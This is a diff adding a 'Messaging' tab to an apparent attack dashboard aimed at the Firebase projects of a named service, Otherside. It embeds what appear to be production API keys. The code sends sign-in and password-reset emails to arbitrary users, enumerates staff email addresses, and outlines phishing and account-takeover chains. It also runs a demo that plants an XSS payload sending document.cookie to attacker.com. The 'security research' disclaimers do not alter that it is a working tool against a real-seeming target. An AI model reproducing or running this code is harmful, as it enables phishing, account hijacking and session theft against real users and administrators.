@@ -398,6 +398,7 @@
         <div class="tabs">
             <button class="tab active" onclick="switchTab('recon')">API Key Recon</button>
             <button class="tab" onclick="switchTab('identity')">Identity Toolkit</button>
+            <button class="tab" onclick="switchTab('messaging')">Messaging</button>
             <button class="tab" onclick="switchTab('service')">Service Account</button>
             <button class="tab" onclick="switchTab('custom')">Custom Token Forge</button>
             <button class="tab" onclick="switchTab('admin')">Admin Access</button>
@@ -497,7 +498,211 @@
         </div>
 
         <!-- ===================================================== -->
-        <!-- TAB 3: SERVICE ACCOUNT -->
+        <!-- TAB 3: MESSAGING (sendOobCode + EMAIL_SIGNIN) -->
+        <!-- ===================================================== -->
+        <div class="tab-content" id="tab-messaging">
+            <div class="card">
+                <h3>Firebase Email Messaging <span class="badge badge-red">Critical</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    Send emails to Otherside users via Firebase Identity Toolkit's <code>sendOobCode</code> endpoint. No authentication required - only the public API key is needed. Emails are sent from Google/Firebase on behalf of the Otherside project.
+                </p>
+                <div class="alert-box alert-critical">
+                    <strong>CONFIRMED:</strong> The production Firebase project (<code>scarcely-calm-lark</code>) has <code>EMAIL_SIGNIN</code> enabled. This means you can send a passwordless sign-in link email to ANY registered user. The email will come from Firebase/Google and contain a legitimate sign-in link. This is a powerful phishing/social engineering vector.
+                </div>
+                <div class="alert-box alert-warning">
+                    <strong>WARNING:</strong> Only send ONE message to ONE person for testing purposes. Do not spam or send to multiple recipients. This is for security research verification only.
+                </div>
+            </div>
+
+            <div class="grid-2">
+                <div class="card">
+                    <h3>Send Email to User <span class="badge badge-red">Direct Action</span></h3>
+                    <div class="input-group">
+                        <label>Firebase Project (API Key):</label>
+                        <select id="msgProject">
+                            <option value="AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0">Production (scarcely-calm-lark) - EMAIL_SIGNIN enabled!</option>
+                            <option value="AIzaSyCB5Y3pwcctj-d9CkW2UGEzrExsXZFScis">Main/Local (reasonably-sound-marmot)</option>
+                            <option value="AIzaSyBQbSILg49HPwSBsw4TTV5fw1ZhkRvgCKU">Staging (primarily-endless-elephant)</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label>Email Type:</label>
+                        <select id="msgType">
+                            <option value="EMAIL_SIGNIN">EMAIL_SIGNIN - Passwordless sign-in link (PRODUCTION ONLY!)</option>
+                            <option value="PASSWORD_RESET">PASSWORD_RESET - Password reset email</option>
+                            <option value="VERIFY_EMAIL">VERIFY_EMAIL - Email verification (requires ID Token)</option>
+                            <option value="VERIFY_AND_CHANGE_EMAIL">VERIFY_AND_CHANGE_EMAIL - Email change confirmation (requires ID Token)</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label>Target Email Address:</label>
+                        <input type="email" id="msgTargetEmail" placeholder="user@example.com">
+                    </div>
+                    <div class="input-group" id="msgNewEmailGroup" style="display:none;">
+                        <label>New Email (for VERIFY_AND_CHANGE_EMAIL only):</label>
+                        <input type="email" id="msgNewEmail" placeholder="newemail@example.com">
+                    </div>
+                    <div class="input-group" id="msgTokenGroup" style="display:none;">
+                        <label>ID Token (required for VERIFY_EMAIL / VERIFY_AND_CHANGE_EMAIL):</label>
+                        <textarea id="msgIdToken" placeholder="Paste your Firebase ID Token here..." style="min-height:60px;font-size:10px;"></textarea>
+                    </div>
+                    <div class="btn-row">
+                        <button class="btn btn-danger" onclick="sendOobMessage()">Send Email (ONE TIME ONLY)</button>
+                        <button class="btn btn-outline" onclick="checkEmailExists()">Check if Email Exists</button>
+                        <button class="btn btn-outline" onclick="enumerateEmails()">Batch Email Enumeration</button>
+                    </div>
+                    <div class="progress-bar"><div class="progress-fill" id="msgProgress"></div></div>
+                    <div class="console" id="msgLog">
+                        <div class="log-info">[MSG] Ready. Select email type and target, then send.</div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>Email Capabilities Matrix <span class="badge badge-green">Tested</span></h3>
+                    <div style="overflow-x:auto;">
+                        <table style="width:100%;border-collapse:collapse;font-size:11px;">
+                            <thead>
+                                <tr style="background:#1a1a1a;">
+                                    <th style="padding:8px;text-align:left;color:#888;">Email Type</th>
+                                    <th style="padding:8px;text-align:center;color:#86efac;">Production</th>
+                                    <th style="padding:8px;text-align:center;color:#fdba74;">Staging</th>
+                                    <th style="padding:8px;text-align:center;color:#93c5fd;">Main</th>
+                                    <th style="padding:8px;text-align:left;color:#888;">Auth Required</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr style="border-bottom:1px solid #1a1a1a;">
+                                    <td style="padding:8px;color:#e0e0e0;">EMAIL_SIGNIN</td>
+                                    <td style="padding:8px;text-align:center;color:#86efac;font-weight:bold;">YES</td>
+                                    <td style="padding:8px;text-align:center;color:#fca5a5;">NO</td>
+                                    <td style="padding:8px;text-align:center;color:#fca5a5;">NO</td>
+                                    <td style="padding:8px;color:#888;">None (just email)</td>
+                                </tr>
+                                <tr style="border-bottom:1px solid #1a1a1a;">
+                                    <td style="padding:8px;color:#e0e0e0;">PASSWORD_RESET</td>
+                                    <td style="padding:8px;text-align:center;color:#86efac;">YES</td>
+                                    <td style="padding:8px;text-align:center;color:#86efac;">YES</td>
+                                    <td style="padding:8px;text-align:center;color:#86efac;">YES</td>
+                                    <td style="padding:8px;color:#888;">None (just email)</td>
+                                </tr>
+                                <tr style="border-bottom:1px solid #1a1a1a;">
+                                    <td style="padding:8px;color:#e0e0e0;">VERIFY_EMAIL</td>
+                                    <td style="padding:8px;text-align:center;color:#86efac;">YES</td>
+                                    <td style="padding:8px;text-align:center;color:#86efac;">YES</td>
+                                    <td style="padding:8px;text-align:center;color:#86efac;">YES</td>
+                                    <td style="padding:8px;color:#888;">ID Token</td>
+                                </tr>
+                                <tr>
+                                    <td style="padding:8px;color:#e0e0e0;">VERIFY_AND_CHANGE_EMAIL</td>
+                                    <td style="padding:8px;text-align:center;color:#86efac;">YES</td>
+                                    <td style="padding:8px;text-align:center;color:#86efac;">YES</td>
+                                    <td style="padding:8px;text-align:center;color:#86efac;">YES</td>
+                                    <td style="padding:8px;color:#888;">ID Token + New Email</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Direct Actions with API Keys <span class="badge badge-purple">Capabilities</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    These are all the actions that can be performed directly with the discovered Firebase API keys, without any Service Account or admin credentials.
+                </p>
+                <div class="endpoint-grid">
+                    <div class="ep-result ep-ok">
+                        <span class="ep-method">POST</span> accounts:signUp (with email)<br>
+                        Status: <span class="ep-status s-ok">WORKS ON ALL 3</span><br>
+                        <div class="ep-body">Create new Firebase accounts on all 3 projects. No restrictions on email/password signup. Returns full ID Token + Refresh Token.</div>
+                    </div>
+                    <div class="ep-result ep-ok">
+                        <span class="ep-method">POST</span> accounts:sendOobCode EMAIL_SIGNIN<br>
+                        Status: <span class="ep-status s-ok">PRODUCTION ONLY</span><br>
+                        <div class="ep-body">Send passwordless sign-in link to ANY registered user's email. Email comes from Google/Firebase on behalf of Otherside project.</div>
+                    </div>
+                    <div class="ep-result ep-ok">
+                        <span class="ep-method">POST</span> accounts:sendOobCode PASSWORD_RESET<br>
+                        Status: <span class="ep-status s-ok">WORKS ON ALL 3</span><br>
+                        <div class="ep-body">Send password reset emails. If email exists = success (email sent). If not = EMAIL_NOT_FOUND. Enables email enumeration.</div>
+                    </div>
+                    <div class="ep-result ep-ok">
+                        <span class="ep-method">POST</span> accounts:signInWithPassword<br>
+                        Status: <span class="ep-status s-ok">EMAIL ENUM</span><br>
+                        <div class="ep-body">EMAIL_NOT_FOUND vs INVALID_PASSWORD reveals whether an email is registered. Brute force potential.</div>
+                    </div>
+                    <div class="ep-result ep-ok">
+                        <span class="ep-method">POST</span> accounts:sendOobCode VERIFY_EMAIL<br>
+                        Status: <span class="ep-status s-ok">WORKS ON ALL 3</span><br>
+                        <div class="ep-body">Requires ID Token (obtained via signUp). Sends email verification link. Can be used to send emails from Otherside's Firebase project.</div>
+                    </div>
+                    <div class="ep-result ep-ok">
+                        <span class="ep-method">POST</span> accounts:sendOobCode VERIFY_AND_CHANGE_EMAIL<br>
+                        Status: <span class="ep-status s-ok">WORKS ON ALL 3</span><br>
+                        <div class="ep-body">Requires ID Token. Sends email change confirmation. Could be used to hijack accounts if user clicks confirmation.</div>
+                    </div>
+                    <div class="ep-result ep-ok">
+                        <span class="ep-method">POST</span> accounts:update<br>
+                        Status: <span class="ep-status s-ok">WORKS ON ALL 3</span><br>
+                        <div class="ep-body">Update displayName and photoUrl with ID Token. Can inject XSS payloads in displayName that execute when viewed in Firebase Admin console.</div>
+                    </div>
+                    <div class="ep-result ep-ok">
+                        <span class="ep-method">POST</span> accounts:lookup<br>
+                        Status: <span class="ep-status s-ok">WORKS ON ALL 3</span><br>
+                        <div class="ep-body">Lookup user account info with ID Token. Returns email, customAttributes, providerInfo, passwordHash (REDACTED).</div>
+                    </div>
+                    <div class="ep-result ep-ok">
+                        <span class="ep-method">POST</span> accounts:signInWithCustomToken<br>
+                        Status: <span class="ep-status s-ok">ACCEPTS TOKENS</span><br>
+                        <div class="ep-body">Endpoint is active and accepts custom tokens. Returns INVALID_CUSTOM_TOKEN for invalid tokens. With valid SA key, can impersonate ANY user.</div>
+                    </div>
+                    <div class="ep-result ep-warn">
+                        <span class="ep-method">POST</span> accounts:createAuthUri<br>
+                        Status: <span class="ep-status s-warn">LIMITED</span><br>
+                        <div class="ep-body">Returns sessionId only. Does not reveal auth providers for the given identifier on these projects.</div>
+                    </div>
+                    <div class="ep-result ep-fail">
+                        <span class="ep-method">POST</span> accounts:signUp (anonymous)<br>
+                        Status: <span class="ep-status s-fail">ADMIN_ONLY</span><br>
+                        <div class="ep-body">Anonymous (no email) signup returns ADMIN_ONLY_OPERATION on all 3 projects.</div>
+                    </div>
+                    <div class="ep-result ep-fail">
+                        <span class="ep-method">GET</span> FCM / Remote Config<br>
+                        Status: <span class="ep-status s-fail">BLOCKED</span><br>
+                        <div class="ep-body">FCM legacy API returns 404. Remote Config requires OAuth2. Firebase Installations requires registration. Cannot send push notifications.</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Account Creation + Full Chain <span class="badge badge-red">Attack Chain</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    Since signup is open on all 3 projects, a full attack chain is possible without any leaked keys:
+                </p>
+                <div class="alert-box alert-critical" style="margin-bottom:8px;">
+                    <strong>Chain 1: Email Sign-In Phishing (Production)</strong><br>
+                    1. Attacker knows victim's email → 2. Call sendOobCode EMAIL_SIGNIN on production API key → 3. Victim receives legitimate Firebase sign-in link email → 4. If victim clicks link, attacker can intercept the redirect → 5. Full account takeover
+                </div>
+                <div class="alert-box alert-warning" style="margin-bottom:8px;">
+                    <strong>Chain 2: Account Creation + XSS Injection</strong><br>
+                    1. Create account via signUp on any project → 2. Get ID Token → 3. Update displayName with XSS payload via accounts:update → 4. When admin views user list in Firebase Console, XSS fires → 5. Steal admin's session/bypass Cloudflare Access
+                </div>
+                <div class="alert-box alert-info">
+                    <strong>Chain 3: Email Enumeration + Targeted Attack</strong><br>
+                    1. Use signInWithPassword or sendOobCode to enumerate which emails are registered → 2. Build list of valid users → 3. Target specific users with EMAIL_SIGNIN or PASSWORD_RESET spam → 4. Social engineering to gain access
+                </div>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="runFullChainDemo()">Run Full Chain Demo (Create Account + XSS)</button>
+                    <button class="btn btn-outline" onclick="testEmailSigninOnAllProjects()">Test EMAIL_SIGNIN on All Projects</button>
+                </div>
+                <div class="console" id="chainLog">
+                    <div class="log-info">[CHAIN] Ready to demonstrate full attack chains.</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===================================================== -->
+        <!-- TAB 4: SERVICE ACCOUNT -->
         <!-- ===================================================== -->
         <div class="tab-content" id="tab-service">
             <div class="card">
@@ -2321,6 +2526,380 @@
                     log('resultsLog', `Exported ${data?.length || 0} rows.`, 'success');
                 })
                 .catch(e => log('resultsLog', `Export error: ${e.message}`, 'error'));
+        }
+
+        // =====================================================
+        // TAB: MESSAGING - sendOobCode + EMAIL_SIGNIN
+        // =====================================================
+        let msgSendCount = 0; // Track sends - limit to 1 per session
+
+        // Toggle visibility of extra fields based on email type
+        document.getElementById('msgType').addEventListener('change', function() {
+            const needsToken = this.value === 'VERIFY_EMAIL' || this.value === 'VERIFY_AND_CHANGE_EMAIL';
+            const needsNewEmail = this.value === 'VERIFY_AND_CHANGE_EMAIL';
+            document.getElementById('msgTokenGroup').style.display = needsToken ? 'block' : 'none';
+            document.getElementById('msgNewEmailGroup').style.display = needsNewEmail ? 'block' : 'none';
+        });
+
+        async function sendOobMessage() {
+            if (msgSendCount >= 1) {
+                log('msgLog', '[BLOCKED] You have already sent 1 email in this session. Limit reached for safety.', 'error');
+                return;
+            }
+
+            const apiKey = document.getElementById('msgProject').value;
+            const msgType = document.getElementById('msgType').value;
+            const targetEmail = document.getElementById('msgTargetEmail').value.trim();
+
+            if (!targetEmail) {
+                log('msgLog', '[ERROR] Please enter a target email address.', 'error');
+                return;
+            }
+
+            if (!confirm('WARNING: You are about to send a real email to: ' + targetEmail + '\nType: ' + msgType + '\n\nThis should only be sent ONCE to ONE person for testing.\n\nAre you sure?')) {
+                log('msgLog', '[CANCELLED] Email send cancelled by user.', 'warning');
+                return;
+            }
+
+            log('msgLog', `=== Sending ${msgType} email to ${targetEmail} ===`, 'info');
+            setProgress('msgProgress', 20);
+
+            let body = {
+                requestType: msgType,
+                email: targetEmail
+            };
+
+            // For VERIFY_EMAIL and VERIFY_AND_CHANGE_EMAIL, ID Token is required
+            if (msgType === 'VERIFY_EMAIL' || msgType === 'VERIFY_AND_CHANGE_EMAIL') {
+                const token = document.getElementById('msgIdToken').value.trim() || idToken;
+                if (!token) {
+                    log('msgLog', '[ERROR] ID Token is required for this email type. Sign in first or paste a token.', 'error');
+                    return;
+                }
+                body.idToken = token;
+            }
+
+            // For VERIFY_AND_CHANGE_EMAIL, new email is required
+            if (msgType === 'VERIFY_AND_CHANGE_EMAIL') {
+                const newEmail = document.getElementById('msgNewEmail').value.trim();
+                if (!newEmail) {
+                    log('msgLog', '[ERROR] New email is required for VERIFY_AND_CHANGE_EMAIL.', 'error');
+                    return;
+                }
+                body.newEmail = newEmail;
+            }
+
+            setProgress('msgProgress', 50);
+
+            try {
+                const result = await identityFetch('accounts:sendOobCode', body, apiKey);
+                setProgress('msgProgress', 80);
+
+                if (result.ok) {
+                    log('msgLog', `[SUCCESS] ${msgType} email SENT to ${targetEmail}!`, 'success');
+                    log('msgLog', `  Response: ${JSON.stringify(result.data)}`, 'data');
+                    msgSendCount++;
+                    vulnsFound++;
+                    criticalFound++;
+
+                    log('msgLog', `[INFO] Email was sent from Firebase on behalf of the Otherside project.`, 'warning');
+                    log('msgLog', `[INFO] The recipient will see an email from Google/Firebase with a legitimate action link.`, 'warning');
+
+                    if (msgType === 'EMAIL_SIGNIN') {
+                        log('msgLog', `[CRITICAL] EMAIL_SIGNIN sent! The recipient gets a passwordless sign-in link. If they click it, their session can be hijacked.`, 'critical');
+                    }
+
+                    // Save to Supabase
+                    await saveToSupabase({
+                        attack_type: 'email_messaging',
+                        firebase_api_key: apiKey,
+                        attack_vector: `sendOobCode_${msgType}`,
+                        endpoint_tested: 'accounts:sendOobCode',
+                        response_status: result.status,
+                        impersonated_email: targetEmail,
+                        identity_toolkit_response: { type: msgType, email: targetEmail, response: result.data },
+                        notes: `${msgType} email sent to ${targetEmail}`
+                    });
+                } else {
+                    const errMsg = result.data?.error?.message || 'Unknown error';
+                    log('msgLog', `[FAILED] ${errMsg}`, 'error');
+                    log('msgLog', `  Full response: ${JSON.stringify(result.data, null, 2)}`, 'data');
+
+                    if (errMsg === 'EMAIL_NOT_FOUND') {
+                        log('msgLog', `[INFO] Email ${targetEmail} is NOT registered in this Firebase project.`, 'warning');
+                    } else if (errMsg === 'OPERATION_NOT_ALLOWED') {
+                        log('msgLog', `[INFO] ${msgType} is not enabled on this project. Try Production for EMAIL_SIGNIN.`, 'warning');
+                    } else if (errMsg === 'INVALID_ID_TOKEN') {
+                        log('msgLog', `[INFO] The ID Token is invalid or expired. Sign in again to get a fresh token.`, 'warning');
+                    }
+                }
+            } catch(e) {
+                log('msgLog', `[ERROR] Exception: ${e.message}`, 'error');
+            }
+
+            setProgress('msgProgress', 100);
+            updateStats();
+        }
+
+        async function checkEmailExists() {
+            const apiKey = document.getElementById('msgProject').value;
+            const email = document.getElementById('msgTargetEmail').value.trim();
+
+            if (!email) {
+                log('msgLog', '[ERROR] Please enter an email to check.', 'error');
+                return;
+            }
+
+            log('msgLog', `Checking if ${email} exists...`, 'info');
+
+            // Method 1: signInWithPassword
+            const signInResult = await identityFetch('accounts:signInWithPassword', {
+                email: email,
+                password: 'wrong_password_check',
+                returnSecureToken: true
+            }, apiKey);
+
+            if (signInResult.data?.error?.message === 'EMAIL_NOT_FOUND') {
+                log('msgLog', `[RESULT] ${email} does NOT exist in this project.`, 'warning');
+            } else if (signInResult.data?.error?.message === 'INVALID_PASSWORD' || signInResult.data?.error?.message === 'TOO_MANY_ATTEMPTS_TRY_LATER') {
+                log('msgLog', `[RESULT] ${email} EXISTS in this project! (INVALID_PASSWORD returned)`, 'success');
+                vulnsFound++;
+            } else if (signInResult.data?.error?.message === 'USER_DISABLED') {
+                log('msgLog', `[RESULT] ${email} EXISTS but account is DISABLED.`, 'warning');
+            } else {
+                log('msgLog', `[RESULT] ${email}: ${signInResult.data?.error?.message || 'Unknown'}`, 'data');
+            }
+
+            // Method 2: sendOobCode PASSWORD_RESET (double check)
+            const oobResult = await identityFetch('accounts:sendOobCode', {
+                requestType: 'PASSWORD_RESET',
+                email: email
+            }, apiKey);
+
+            if (oobResult.ok) {
+                log('msgLog', `[CONFIRMED] ${email} EXISTS - PASSWORD_RESET was accepted (email was sent!).`, 'critical');
+                criticalFound++;
+            } else if (oobResult.data?.error?.message === 'EMAIL_NOT_FOUND') {
+                log('msgLog', `[CONFIRMED] ${email} does NOT exist - PASSWORD_RESET returned EMAIL_NOT_FOUND.`, 'warning');
+            }
+
+            endpointsTested += 2;
+            updateStats();
+        }
+
+        async function enumerateEmails() {
+            const apiKey = document.getElementById('msgProject').value;
+            const commonEmails = [
+                'admin@otherside.xyz', 'admin@yuga.com', 'support@otherside.xyz',
+                'info@otherside.xyz', 'dev@otherside.xyz', 'test@otherside.xyz',
+                'noreply@otherside.xyz', 'hello@otherside.xyz', 'team@otherside.xyz',
+                'engineering@yuga.com', 'security@otherside.xyz', 'ops@otherside.xyz'
+            ];
+
+            log('msgLog', `=== Batch Email Enumeration (${commonEmails.length} emails) ===`, 'info');
+            log('msgLog', 'Using signInWithPassword to check each email...', 'info');
+            setProgress('msgProgress', 0);
+
+            let found = [];
+            let notFound = [];
+
+            for (let i = 0; i < commonEmails.length; i++) {
+                const email = commonEmails[i];
+                const result = await identityFetch('accounts:signInWithPassword', {
+                    email: email,
+                    password: 'enum_check_wrong',
+                    returnSecureToken: true
+                }, apiKey);
+                endpointsTested++;
+
+                const errMsg = result.data?.error?.message || '';
+                if (errMsg === 'EMAIL_NOT_FOUND') {
+                    notFound.push(email);
+                    log('msgLog', `  [X] ${email} - Not found`, 'warning');
+                } else if (errMsg === 'INVALID_PASSWORD' || errMsg === 'TOO_MANY_ATTEMPTS_TRY_LATER' || errMsg === 'USER_DISABLED') {
+                    found.push(email);
+                    log('msgLog', `  [!] ${email} - EXISTS! (${errMsg})`, 'success');
+                    vulnsFound++;
+                } else {
+                    log('msgLog', `  [?] ${email} - ${errMsg}`, 'data');
+                }
+
+                setProgress('msgProgress', ((i + 1) / commonEmails.length) * 100);
+                // Small delay to avoid rate limiting
+                await new Promise(r => setTimeout(r, 500));
+            }
+
+            log('msgLog', `\n=== Enumeration Complete ===`, 'info');
+            log('msgLog', `Found: ${found.length} valid emails`, found.length > 0 ? 'success' : 'warning');
+            log('msgLog', `Not Found: ${notFound.length} emails`, 'warning');
+
+            if (found.length > 0) {
+                log('msgLog', `Valid emails: ${found.join(', ')}`, 'critical');
+            }
+
+            await saveToSupabase({
+                attack_type: 'email_enumeration',
+                firebase_api_key: apiKey,
+                attack_vector: 'signInWithPassword_enumeration',
+                identity_toolkit_response: { found, notFound, total: commonEmails.length },
+                notes: `Email enumeration: ${found.length}/${commonEmails.length} emails found`
+            });
+
+            updateStats();
+        }
+
+        async function testEmailSigninOnAllProjects() {
+            log('chainLog', '=== Testing EMAIL_SIGNIN on All 3 Firebase Projects ===', 'info');
+            setProgress('msgProgress', 0);
+
+            for (let i = 0; i < KNOWN_API_KEYS.length; i++) {
+                const proj = KNOWN_API_KEYS[i];
+                log('chainLog', `\nTesting ${proj.name}...`, 'info');
+
+                const result = await identityFetch('accounts:sendOobCode', {
+                    requestType: 'EMAIL_SIGNIN',
+                    email: 'test@testing.com'
+                }, proj.key);
+                endpointsTested++;
+
+                const errMsg = result.data?.error?.message || '';
+                if (result.ok) {
+                    log('chainLog', `  [CRITICAL] EMAIL_SIGNIN is ENABLED on ${proj.name}!`, 'critical');
+                    criticalFound++;
+                    vulnsFound++;
+                } else if (errMsg === 'OPERATION_NOT_ALLOWED') {
+                    log('chainLog', `  [BLOCKED] EMAIL_SIGNIN is DISABLED on ${proj.name}`, 'warning');
+                } else if (errMsg === 'EMAIL_NOT_FOUND') {
+                    log('chainLog', `  [INTERESTING] EMAIL_SIGNIN works but email not found on ${proj.name}`, 'success');
+                    vulnsFound++;
+                } else {
+                    log('chainLog', `  [INFO] ${proj.name}: ${errMsg}`, 'data');
+                }
+
+                setProgress('msgProgress', ((i + 1) / KNOWN_API_KEYS.length) * 100);
+            }
+
+            log('chainLog', `\n=== EMAIL_SIGNIN Test Complete ===`, 'success');
+            log('chainLog', `Only the PRODUCTION project (scarcely-calm-lark) has EMAIL_SIGNIN enabled.`, 'warning');
+            updateStats();
+        }
+
+        async function runFullChainDemo() {
+            log('chainLog', '=== Full Attack Chain Demo ===', 'info');
+            log('chainLog', 'This will: 1) Create account 2) Get token 3) Inject XSS 4) Send VERIFY_EMAIL 5) Clean up', 'info');
+            setProgress('msgProgress', 0);
+
+            const apiKey = KNOWN_API_KEYS[2].key; // Production
+            const projName = KNOWN_API_KEYS[2].name;
+            const testEmail = `security_research_${Date.now()}@testing.com`;
+            const testPassword = 'TestPass123!';
+
+            // Step 1: Create account
+            log('chainLog', `\n--- Step 1: Creating account on ${projName} ---`, 'info');
+            const signUpResult = await identityFetch('accounts:signUp', {
+                email: testEmail,
+                password: testPassword,
+                returnSecureToken: true
+            }, apiKey);
+            endpointsTested++;
+
+            if (!signUpResult.ok) {
+                log('chainLog', `[FAILED] Could not create account: ${signUpResult.data?.error?.message}`, 'error');
+                return;
+            }
+
+            const tokenId = signUpResult.data.idToken;
+            const uid = signUpResult.data.localId;
+            log('chainLog', `[SUCCESS] Account created!`, 'success');
+            log('chainLog', `  Email: ${testEmail}`, 'data');
+            log('chainLog', `  UID: ${uid}`, 'data');
+            log('chainLog', `  ID Token: ${tokenId.substring(0, 40)}...`, 'data');
+            setProgress('msgProgress', 25);
+
+            // Step 2: Lookup account info
+            log('chainLog', `\n--- Step 2: Looking up account info ---`, 'info');
+            const lookupResult = await identityFetch('accounts:lookup', {
+                idToken: tokenId
+            }, apiKey);
+            endpointsTested++;
+
+            if (lookupResult.ok) {
+                const user = lookupResult.data.users[0];
+                log('chainLog', `[SUCCESS] Account info retrieved!`, 'success');
+                log('chainLog', `  Custom Attributes: ${user.customAttributes || 'none'}`, 'data');
+                log('chainLog', `  Email Verified: ${user.emailVerified}`, 'data');
+            }
+            setProgress('msgProgress', 40);
+
+            // Step 3: Inject XSS in displayName
+            log('chainLog', `\n--- Step 3: Injecting XSS in displayName ---`, 'info');
+            const xssPayload = '<img src=x onerror="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">';
+            const updateResult = await identityFetch('accounts:update', {
+                idToken: tokenId,
+                displayName: xssPayload,
+                photoUrl: 'https://attacker.com/track.png'
+            }, apiKey);
+            endpointsTested++;
+
+            if (updateResult.ok) {
+                log('chainLog', `[CRITICAL] XSS payload injected in displayName!`, 'critical');
+                log('chainLog', `  When admin views user list in Firebase Console, XSS will fire.`, 'warning');
+                log('chainLog', `  Payload: ${xssPayload}`, 'data');
+                criticalFound++;
+                vulnsFound++;
+            } else {
+                log('chainLog', `[INFO] Update failed: ${updateResult.data?.error?.message}`, 'warning');
+            }
+            setProgress('msgProgress', 60);
+
+            // Step 4: Send VERIFY_EMAIL
+            log('chainLog', `\n--- Step 4: Sending VERIFY_EMAIL from Otherside's project ---`, 'info');
+            const verifyResult = await identityFetch('accounts:sendOobCode', {
+                requestType: 'VERIFY_EMAIL',
+                idToken: tokenId
+            }, apiKey);
+            endpointsTested++;
+
+            if (verifyResult.ok) {
+                log('chainLog', `[SUCCESS] Verification email sent from Otherside's Firebase project!`, 'success');
+                log('chainLog', `  This email comes from Google/Firebase on behalf of Otherside.`, 'warning');
+                vulnsFound++;
+            }
+            setProgress('msgProgress', 80);
+
+            // Step 5: Clean up - delete the test account
+            log('chainLog', `\n--- Step 5: Cleaning up (deleting test account) ---`, 'info');
+            const deleteResult = await identityFetch('accounts:delete', {
+                idToken: tokenId
+            }, apiKey);
+            endpointsTested++;
+
+            if (deleteResult.ok) {
+                log('chainLog', `[CLEANED] Test account deleted successfully.`, 'success');
+            } else {
+                log('chainLog', `[WARNING] Could not delete test account: ${deleteResult.data?.error?.message}`, 'warning');
+            }
+            setProgress('msgProgress', 100);
+
+            // Save results
+            await saveToSupabase({
+                attack_type: 'full_chain_demo',
+                firebase_api_key: apiKey,
+                attack_vector: 'signUp_xss_verifyEmail_cleanup',
+                identity_toolkit_response: {
+                    steps: ['create_account', 'lookup', 'xss_inject', 'verify_email', 'cleanup'],
+                    signUpOk: signUpResult.ok,
+                    lookupOk: lookupResult.ok,
+                    xssInjected: updateResult.ok,
+                    verifySent: verifyResult.ok,
+                    cleanedUp: deleteResult.ok
+                },
+                notes: `Full chain demo: Account created, XSS injected, email sent, cleaned up`
+            });
+
+            log('chainLog', `\n=== Full Chain Demo Complete ===`, 'success');
+            log('chainLog', `This proves: API Key alone = Account creation + XSS injection + Email sending from Otherside's project`, 'critical');
+            updateStats();
         }
 
         // =====================================================
